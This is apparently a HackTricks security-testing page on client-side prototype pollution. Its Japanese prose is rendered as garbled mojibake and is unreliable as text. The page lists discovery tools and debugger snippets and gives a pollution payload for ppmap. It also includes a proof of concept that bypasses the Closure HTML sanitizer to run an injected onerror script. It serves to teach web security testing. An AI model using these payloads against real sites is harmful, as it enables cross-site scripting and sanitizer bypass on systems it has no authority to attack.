# ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ Prototype Pollution

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ãƒã‚§ãƒƒã‚¯ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã™ã‚‹ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>

## è‡ªå‹•ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ãŸç™ºè¦‹

ãƒ„ãƒ¼ãƒ« [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**ã€** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **ãŠã‚ˆã³** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) ã¯ã€**prototype pollutionã®è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã‚‹**ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚

ã•ã‚‰ã«ã€**ãƒ–ãƒ©ã‚¦ã‚¶æ‹¡å¼µæ©Ÿèƒ½** [**PPScan**](https://github.com/msrkp/PPScan) ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹**ãƒšãƒ¼ã‚¸ã‚’è‡ªå‹•çš„ã«ã‚¹ã‚­ãƒ£ãƒ³**ã—ã€prototype pollutionã®è„†å¼±æ€§ã‚’**è‡ªå‹•çš„ã«**æ¤œå‡ºã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

### ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´æ‰€ã®ãƒ‡ãƒãƒƒã‚° <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®æ ¹æœ¬åŸå› ã‚’è¦‹ã¤ã‘ã‚‹ <a href="#5530" id="5530"></a>

ã„ãšã‚Œã‹ã®ãƒ„ãƒ¼ãƒ«ã§**ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®è„†å¼±æ€§**ãŒ**ç‰¹å®š**ã•ã‚ŒãŸå ´åˆã€ã‚‚ã—**ã‚³ãƒ¼ãƒ‰**ãŒã‚ã¾ã‚Š**è¤‡é›‘ã§ãªã„**ãªã‚‰ã€Chrome Developer Toolsã§JSã‚³ãƒ¼ãƒ‰å†…ã‚’**`location.hash/decodeURIComponent/location.search`**ã¨ã„ã†**ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰**ã§**æ¤œç´¢**ã—ã€è„†å¼±ãªç®‡æ‰€ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚³ãƒ¼ãƒ‰ãŒå¤§ããè¤‡é›‘ãªå ´åˆã€è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã‚’**ç™ºè¦‹ã™ã‚‹ç°¡å˜ãªæ–¹æ³•**ãŒã‚ã‚Šã¾ã™ï¼š

* ãƒ„ãƒ¼ãƒ«ã®ä¸€ã¤ã‚’ä½¿ç”¨ã—ã¦**è„†å¼±æ€§ã‚’è¦‹ã¤ã‘**ã€ã‚³ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚¿å†…ã§**ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’è¨­å®šã™ã‚‹**ãŸã‚ã®**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã‚’å–å¾—ã—ã¾ã™ã€‚ppmapã§ã¯ã€æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ãŒæä¾›ã•ã‚Œã¾ã™ï¼š`constructor[prototype][ppmap]=reserved`
* æ¬¡ã«ã€ãƒšãƒ¼ã‚¸ã§å®Ÿè¡Œã•ã‚Œã‚‹æœ€åˆã®JSã‚³ãƒ¼ãƒ‰è¡Œã«**ãƒ–ãƒ¬ãƒ¼ã‚¯ãƒã‚¤ãƒ³ãƒˆã‚’è¨­å®š**ã—ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚€ãƒšãƒ¼ã‚¸ã‚’ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ã—ã¦ã€ãã“ã§**å®Ÿè¡ŒãŒä¸€æ™‚åœæ­¢ã™ã‚‹**ã‚ˆã†ã«ã—ã¾ã™ã€‚
* JSã®å®Ÿè¡ŒãŒä¸€æ™‚åœæ­¢ã—ã¦ã„ã‚‹é–“ã«ã€JSã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«ä»¥ä¸‹ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’**è²¼ã‚Šä»˜ã‘ã¾ã™**ã€‚ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ã€'ppmap'ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒä½œæˆã•ã‚ŒãŸæ™‚ç‚¹ã‚’ç¤ºã™ã®ã§ã€ãã‚ŒãŒã©ã“ã§ä½œæˆã•ã‚ŒãŸã‹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if ( debugGet )
debugger;
return origValue;
},
set: function(val) {
debugger;
return origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
**Sources**ã«æˆ»ã‚Šã€ã€Œ**Resume** script **execution**ã€ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚ã“ã‚Œã‚’è¡Œã†ã¨ã€å…¨ã¦ã®**javascript**ãŒ**å®Ÿè¡Œ**ã•ã‚Œã€äºˆæƒ³é€šã‚ŠppmapãŒå†ã³æ±šæŸ“ã•ã‚Œã¾ã™ã€‚ã‚¹ãƒ‹ãƒšãƒƒãƒˆã®åŠ©ã‘ã‚’å€Ÿã‚Šã¦ã€ppmapãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒæ­£ç¢ºã«ã©ã“ã§æ±šæŸ“ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**Call** **Stack**ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹ã¨ã€**pollution**ãŒ**ç™ºç”Ÿã—ãŸ****ç•°ãªã‚‹**ã‚¹ã‚¿ãƒƒã‚¯ã«ç›´é¢ã—ã¾ã™ã€‚

ã—ã‹ã—ã€ã©ã‚Œã‚’é¸ã¶ã¹ãã§ã—ã‚‡ã†ã‹ï¼Ÿã»ã¨ã‚“ã©ã®å ´åˆã€Prototype Pollutionã¯Javascriptãƒ©ã‚¤ãƒ–ãƒ©ãƒªã§ç™ºç”Ÿã™ã‚‹ã®ã§ã€.jsãƒ©ã‚¤ãƒ–ãƒ©ãƒªãƒ•ã‚¡ã‚¤ãƒ«ã«æ·»ä»˜ã•ã‚Œã¦ã„ã‚‹ã‚¹ã‚¿ãƒƒã‚¯ã‚’ç›®æŒ‡ã—ã¾ã™ï¼ˆç”»åƒã®å³å´ã‚’è¦‹ã¦ã€ã©ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¹ã‚¿ãƒƒã‚¯ãŒæ·»ä»˜ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’ç¢ºèªã—ã¾ã™ï¼‰ã€‚ã“ã®å ´åˆã€4è¡Œç›®ã¨6è¡Œç›®ã«2ã¤ã®ã‚¹ã‚¿ãƒƒã‚¯ãŒã‚ã‚Šã¾ã™ãŒã€è«–ç†çš„ã«ã¯æ±šæŸ“ãŒåˆã‚ã¦ç™ºç”Ÿã™ã‚‹4è¡Œç›®ã‚’é¸ã³ã¾ã™ã€‚ã“ã‚Œã¯ã€ã“ã®è¡ŒãŒè„†å¼±æ€§ã®åŸå› ã§ã‚ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚ã‚¹ã‚¿ãƒƒã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹ã¨ã€è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã•ã‚Œã¾ã™ã€‚

![](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ç™ºè¦‹

ã‚¬ã‚¸ã‚§ãƒƒãƒˆã¯ã€**PPè„†å¼±æ€§ãŒç™ºè¦‹ã•ã‚ŒãŸå¾Œã«æ‚ªç”¨ã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰**ã§ã™ã€‚

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒã‚·ãƒ³ãƒ—ãƒ«ãªå ´åˆã€**`srcdoc/innerHTML/iframe/createElement`**ã®ã‚ˆã†ãª**ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰**ã‚’**æ¤œç´¢**ã—ã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’ãƒ¬ãƒ“ãƒ¥ãƒ¼ã—ã¦javascriptå®Ÿè¡Œã«**ç¹‹ãŒã‚‹ã‹**ã‚’ç¢ºèªã—ã¾ã™ã€‚æ™‚ã«ã¯ã€ä¸Šè¨˜ã®æŠ€è¡“ã§ã¯ã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒå…¨ãè¦‹ã¤ã‹ã‚‰ãªã„ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚ãã®å ´åˆã€ç´”ç²‹ãªã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãƒ¬ãƒ“ãƒ¥ãƒ¼ãŒä»¥ä¸‹ã®ä¾‹ã®ã‚ˆã†ãªç´ æ™´ã‚‰ã—ã„ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’æ˜ã‚‰ã‹ã«ã—ã¾ã™ã€‚

### ä¾‹ Mithilãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚³ãƒ¼ãƒ‰ã§PPã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹

ã“ã®ãƒ©ã‚¤ãƒˆã‚¢ãƒƒãƒ—ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼š[https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## è„†å¼±ãªãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®å†ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PPã‚’ä»‹ã—ãŸHTMLã‚µãƒ‹ã‚¿ã‚¤ã‚¶ãƒ¼ã®ãƒã‚¤ãƒ‘ã‚¹

[**ã“ã®ç ”ç©¶**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)ã¯ã€ã„ãã¤ã‹ã®HTMLã‚µãƒ‹ã‚¿ã‚¤ã‚¶ãƒ¼ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«ã‚ˆã£ã¦æä¾›ã•ã‚Œã‚‹ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã‚’**ãƒã‚¤ãƒ‘ã‚¹**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹PPã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ç¤ºã—ã¦ã„ã¾ã™ï¼š

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

* #### Closure
```html
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## å‚è€ƒæ–‡çŒ®

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã«ãªã‚‹æ–¹æ³•ã‚’å­¦ã¶</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã™ã‚‹ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã§**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>
